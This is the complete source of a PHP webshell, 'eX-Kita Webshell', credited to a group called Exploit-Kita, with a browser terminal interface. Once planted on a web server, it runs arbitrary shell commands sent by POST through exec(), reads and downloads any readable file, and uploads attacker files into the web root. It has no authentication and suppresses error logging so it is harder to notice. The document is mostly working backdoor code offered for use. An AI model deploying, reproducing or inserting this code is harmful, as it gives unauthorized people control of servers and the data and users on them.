<?php
/*

███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗   ██╗  ██╗██╗████████╗ █████╗ 
██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝   ██║ ██╔╝██║╚══██╔══╝██╔══██╗
█████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║█████╗█████╔╝ ██║   ██║   ███████║
██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║╚════╝██╔═██╗ ██║   ██║   ██╔══██║
███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║      ██║  ██╗██║   ██║   ██║  ██║
╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝      ╚═╝  ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═╝

# eX-Kita Webshell (Exploit-Kita Webshell) - Copyright © by Exploit-Kita
# FB : fb.com/ExploitKita/
# Website : exploit-kita.org
# Blog : exploitkita.org
# Greets : IndoXploit, ZeroByte.id, Typical Idiot Security, Indonesian Code Party, Xai Syndicate, and you all h3h3.

*/

error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
date_default_timezone_set("Asia/Jakarta");

function featureShell($cmd, $cwd) {
    $stdout = array();

    if (preg_match("/^\s*cd\s*$/", $cmd)) {
        // pass
    } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd)) {
        chdir($cwd);
        preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
        chdir($match[1]);
    } elseif (preg_match("/^\s*download\s+[^\s]+\s*(2>&1)?$/", $cmd)) {
        chdir($cwd);
        preg_match("/^\s*download\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
        return featureDownload($match[1]);
    } else {
        chdir($cwd);
        exec($cmd, $stdout);
    }

    return array(
        "stdout" => $stdout,
        "cwd" => getcwd()
    );
}

function featurePwd() {
    return array("cwd" => getcwd());
}

function featureHint($fileName, $cwd, $type) {
    chdir($cwd);
    if ($type == 'cmd') {
        $cmd = "compgen -c $fileName";
    } else {
        $cmd = "compgen -f $fileName";
    }
    $cmd = "/bin/bash -c \"$cmd\"";
    $files = explode("\n", shell_exec($cmd));
    return array(
        'files' => $files,
    );
}

function featureDownload($filePath) {
    $file = @file_get_contents($filePath);
    if ($file === FALSE) {
        return array(
            'stdout' => array('File not found / no read permission.'),
            'cwd' => getcwd()
        );
    } else {
        return array(
            'name' => basename($filePath),
            'file' => base64_encode($file)
        );
    }
}

function featureUpload($path, $file, $cwd) {
    chdir($cwd);
    $f = @fopen($path, 'wb');
    if ($f === FALSE) {
        return array(
            'stdout' => array('Invalid path / no write permission.'),
            'cwd' => getcwd()
        );
    } else {
        fwrite($f, base64_decode($file));
        fclose($f);
        return array(
            'stdout' => array('Done.'),
            'cwd' => getcwd()
        );
    }
}

if (isset($_GET["feature"])) {

    $response = NULL;

    switch ($_GET["feature"]) {
        case "shell":
            $cmd = $_POST['cmd'];
            if (!preg_match('/2>/', $cmd)) {
                $cmd .= ' 2>&1';
            }
            $response = featureShell($cmd, $_POST["cwd"]);
            break;
        case "pwd":
            $response = featurePwd();
            break;
        case "hint":
            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);
            break;
        case 'upload':
            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);
    }

    header("Content-Type: application/json");
    echo json_encode($response);
    die();
}

?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html lang="en-US" xmlns="http://www.w3.org/1999/xhtml" prefix="og: http://ogp.me/ns#">

    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title><?php echo "".htmlspecialchars($_SERVER["SERVER_ADMIN"])."";?></title>
		<link rel="icon" type="image/png" href="http://www.google.com/s2/favicons?domain=<?php echo "".htmlspecialchars($_SERVER["SERVER_NAME"])."";?>"/>
		<meta name="robots" content="noindex" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <style>
            html, body {
                margin: 0;
                padding: 0;
                background: rgba(40, 44, 52, 1);
                color: #eee;
                font-family: monospace;
            }

            #shell {
                background: #222;
                max-width: 1000px;
                margin: 50px auto 0 auto;
                box-shadow: 0 0 5px rgba(0, 0, 0, .3);
                font-size: 10pt;
                display: flex;
                flex-direction: column;
                align-items: stretch;
            }

            #shell-content {
                height: 500px;
                overflow: auto;
                padding: 5px;
                white-space: pre-wrap;
                flex-grow: 1;
            }

            #shell-logo {
                font-weight: bold;
                color: #FF4180;
                text-align: center;
            }

            @media (max-width: 991px) {
                #shell-logo {
                    display: none;
                }

                html, body, #shell {
                    height: 100%;
                    width: 100%;
                    max-width: none;
                }

                #shell {
                    margin-top: 0;
                }
            }

            @media (max-width: 767px) {
                #shell-input {
                    flex-direction: column;
                }
            }

            .shell-prompt {
                font-weight: bold;
                color: #75DF0B;
            }

            .shell-prompt > span {
                color: #1BC9E7;
            }

            #shell-input {
                display: flex;
                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);
                border-top: rgba(255, 255, 255, .05) solid 1px;
            }

            #shell-input > label {
                flex-grow: 0;
                display: block;
                padding: 0 5px;
                height: 30px;
                line-height: 30px;
            }

            #shell-input #shell-cmd {
                height: 30px;
                line-height: 30px;
                border: none;
                background: transparent;
                color: #eee;
                font-family: monospace;
                font-size: 10pt;
                width: 100%;
                align-self: center;
            }

            #shell-input div {
                flex-grow: 1;
                align-items: stretch;
            }

            #shell-input input {
                outline: none;
            }
			
			@keyframes blink {
				0%{opacity:0}
				10%{opacity:1}
				20%{opacity:0}
				30%{opacity:1}
				40%{opacity:0}
				50%{opacity:1}
				60%{opacity:0}
				70%{opacity:1}
				80%{opacity:0}
				90%{opacity:1}
				95%{opacity:0}
				100%{opacity:1}
			}
			
			a:hover, a:active {
				opacity:1;
				animation-name:blink;
				animation-duration:0.5s
			}
        </style>

        <script>
            var CWD = null;
            var commandHistory = [];
            var historyPosition = 0;
            var eShellCmdInput = null;
            var eShellContent = null;

            function _insertCommand(command) {
                eShellContent.innerHTML += "\n\n";
                eShellContent.innerHTML += '<span class=\"shell-prompt\">' + genPrompt(CWD) + '</span> ';
                eShellContent.innerHTML += escapeHtml(command);
                eShellContent.innerHTML += "\n";
                eShellContent.scrollTop = eShellContent.scrollHeight;
            }

            function _insertStdout(stdout) {
                eShellContent.innerHTML += escapeHtml(stdout);
                eShellContent.scrollTop = eShellContent.scrollHeight;
            }

            function featureShell(command) {

                _insertCommand(command);
                if (/^\s*upload\s+[^\s]+\s*$/.test(command)) {
                    featureUpload(command.match(/^\s*upload\s+([^\s]+)\s*$/)[1]);
                } else if (/^\s*clear\s*$/.test(command)) {
                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer
                    eShellContent.innerHTML = '';
                } else {
                    makeRequest("?feature=shell", {cmd: command, cwd: CWD}, function (response) {
                        if (response.hasOwnProperty('file')) {
                            featureDownload(response.name, response.file)
                        } else {
                            _insertStdout(response.stdout.join("\n"));
                            updateCwd(response.cwd);
                        }
                    });
                }
            }

            function featureHint() {
                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete

                function _requestCallback(data) {
                    if (data.files.length <= 1) return;  // no completion

                    if (data.files.length === 2) {
                        if (type === 'cmd') {
                            eShellCmdInput.value = data.files[0];
                        } else {
                            var currentValue = eShellCmdInput.value;
                            eShellCmdInput.value = currentValue.replace(/([^\s]*)$/, data.files[0]);
                        }
                    } else {
                        _insertCommand(eShellCmdInput.value);
                        _insertStdout(data.files.join("\n"));
                    }
                }

                var currentCmd = eShellCmdInput.value.split(" ");
                var type = (currentCmd.length === 1) ? "cmd" : "file";
                var fileName = (type === "cmd") ? currentCmd[0] : currentCmd[currentCmd.length - 1];

                makeRequest(
                    "?feature=hint",
                    {
                        filename: fileName,
                        cwd: CWD,
                        type: type
                    },
                    _requestCallback
                );

            }

            function featureDownload(name, file) {
                var element = document.createElement('a');
                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);
                element.setAttribute('download', name);
                element.style.display = 'none';
                document.body.appendChild(element);
                element.click();
                document.body.removeChild(element);
                _insertStdout('Done.');
            }

            function featureUpload(path) {
                var element = document.createElement('input');
                element.setAttribute('type', 'file');
                element.style.display = 'none';
                document.body.appendChild(element);
                element.addEventListener('change', function () {
                    var promise = getBase64(element.files[0]);
                    promise.then(function (file) {
                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {
                            _insertStdout(response.stdout.join("\n"));
                            updateCwd(response.cwd);
                        });
                    }, function () {
                        _insertStdout('An unknown client-side error occurred.');
                    });
                });
                element.click();
                document.body.removeChild(element);
            }

            function getBase64(file, onLoadCallback) {
                return new Promise(function(resolve, reject) {
                    var reader = new FileReader();
                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };
                    reader.onerror = reject;
                    reader.readAsDataURL(file);
                });
            }

            function genPrompt(cwd) {
                cwd = cwd || "~";
                var shortCwd = cwd;
                if (cwd.split("/").length > 3) {
                    var splittedCwd = cwd.split("/");
                    shortCwd = "…/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];
                }
                return "Exploit-Kita@org:<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
            }

            function updateCwd(cwd) {
                if (cwd) {
                    CWD = cwd;
                    _updatePrompt();
                    return;
                }
                makeRequest("?feature=pwd", {}, function(response) {
                    CWD = response.cwd;
                    _updatePrompt();
                });

            }

            function escapeHtml(string) {
                return string
                    .replace(/&/g, "&amp;")
                    .replace(/</g, "&lt;")
                    .replace(/>/g, "&gt;");
            }

            function _updatePrompt() {
                var eShellPrompt = document.getElementById("shell-prompt");
                eShellPrompt.innerHTML = genPrompt(CWD);
            }

            function _onShellCmdKeyDown(event) {
                switch (event.key) {
                    case "Enter":
                        featureShell(eShellCmdInput.value);
                        insertToHistory(eShellCmdInput.value);
                        eShellCmdInput.value = "";
                        break;
                    case "ArrowUp":
                        if (historyPosition > 0) {
                            historyPosition--;
                            eShellCmdInput.blur();
                            eShellCmdInput.focus();
                            eShellCmdInput.value = commandHistory[historyPosition];
                        }
                        break;
                    case "ArrowDown":
                        if (historyPosition >= commandHistory.length) {
                            break;
                        }
                        historyPosition++;
                        if (historyPosition === commandHistory.length) {
                            eShellCmdInput.value = "";
                        } else {
                            eShellCmdInput.blur();
                            eShellCmdInput.focus();
                            eShellCmdInput.value = commandHistory[historyPosition];
                        }
                        break;
                    case 'Tab':
                        event.preventDefault();
                        featureHint();
                        break;
                }
            }

            function insertToHistory(cmd) {
                commandHistory.push(cmd);
                historyPosition = commandHistory.length;
            }

            function makeRequest(url, params, callback) {
                function getQueryString() {
                    var a = [];
                    for (var key in params) {
                        if (params.hasOwnProperty(key)) {
                            a.push(encodeURIComponent(key) + "=" + encodeURIComponent(params[key]));
                        }
                    }
                    return a.join("&");
                }
                var xhr = new XMLHttpRequest();
                xhr.open("POST", url, true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.onreadystatechange = function() {
                    if (xhr.readyState === 4 && xhr.status === 200) {
                        try {
                            var responseJson = JSON.parse(xhr.responseText);
                            callback(responseJson);
                        } catch (error) {
                            alert("Error while parsing response: " + error);
                        }
                    }
                };
                xhr.send(getQueryString());
            }

            window.onload = function() {
                eShellCmdInput = document.getElementById("shell-cmd");
                eShellContent = document.getElementById("shell-content");
                updateCwd();
                eShellCmdInput.focus();
            };
        </script>
    </head>

    <body>
        <div id="shell">
            <pre id="shell-content"><div id="shell-logo">
			<a href="#" onclick="window.location.reload(true);" style="text-decoration: none;color: red;">
           __    __         __    __  __    __               
          /  |  /  |       /  |  /  |/  |  /  |              
  ______  $$ |  $$ |       $$ | /$$/ $$/  _$$ |_     ______  
 /      \ $$  \/$$/ ______ $$ |/$$/  /  |/ $$   |   /      \ 
/$$$$$$  | $$  $$< /      |$$  $$<   $$ |$$$$$$/    $$$$$$  |
$$    $$ |  $$$$  \$$$$$$/ $$$$$  \  $$ |  $$ | __  /    $$ |
$$$$$$$$/  $$ /$$  |       $$ |$$  \ $$ |  $$ |/  |/$$$$$$$ |
$$       |$$ |  $$ |       $$ | $$  |$$ |  $$  $$/ $$    $$ |
 $$$$$$$/ $$/   $$/        $$/   $$/ $$/    $$$$/   $$$$$$$/ </a>
eX-Kita Webshell
<?php
echo "<font color='lightblue'>System : <b>".php_uname()."</b></font><br>";
echo "<font color='lime'>IP Server : <b>".htmlspecialchars($_SERVER['SERVER_ADDR'])."</b> | My IP : <b>".htmlspecialchars($_SERVER['REMOTE_ADDR'])."</b></font>";
echo "<form method='post' enctype='multipart/form-data'><label for='files' style='color: white'>Filename : </label><input type='file' name='files'><input type='submit' name='upload' value='upload'></form>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['files']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
	if(is_writable($root)) {
		if(@copy($_FILES['files']['tmp_name'], $dest)) {
			$web = "http://".$_SERVER['HTTP_HOST']."/";
			echo "Success Upload -> <a href='$web$files' target='_blank' style='text-decoration:none;color:lime;'><b><u>$web$files</u></b></a>";
			} else {
				echo "Fail Upload to Directory Root.";
				}
			} else {
				if(@copy($_FILES['files']['tmp_name'], $files)) {
					echo "Success Upload <b>$files</b> in this folder.";
				} else {
					echo "FAIL";
				}
			}
}
echo "<hr width='30%'>";
?>
			</div></pre>
            <div id="shell-input">
                <label for="shell-cmd" id="shell-prompt" class="shell-prompt">???</label>
                <div>
                    <input id="shell-cmd" name="cmd" onkeydown="_onShellCmdKeyDown(event)"/>
                </div>
            </div>
        </div>
		<footer style="position:fixed; left:1px; right:1px; bottom:0px; border-top: 1px solid cyan; background-color: transparent; color: white; text-align: center;">
		Copyright <?php echo''.date("Y").'';?> &copy; by <a href="//www.facebook.com/ExploitKita/" style="text-decoration:none; color:aqua; text-shadow: 2px 2px 3px black;" target="_blank">Exploit-Kita.org</a> | Host : <?php echo ''.htmlspecialchars($_SERVER['HTTP_HOST']).'';?>
		</footer>
    </body>

</html>
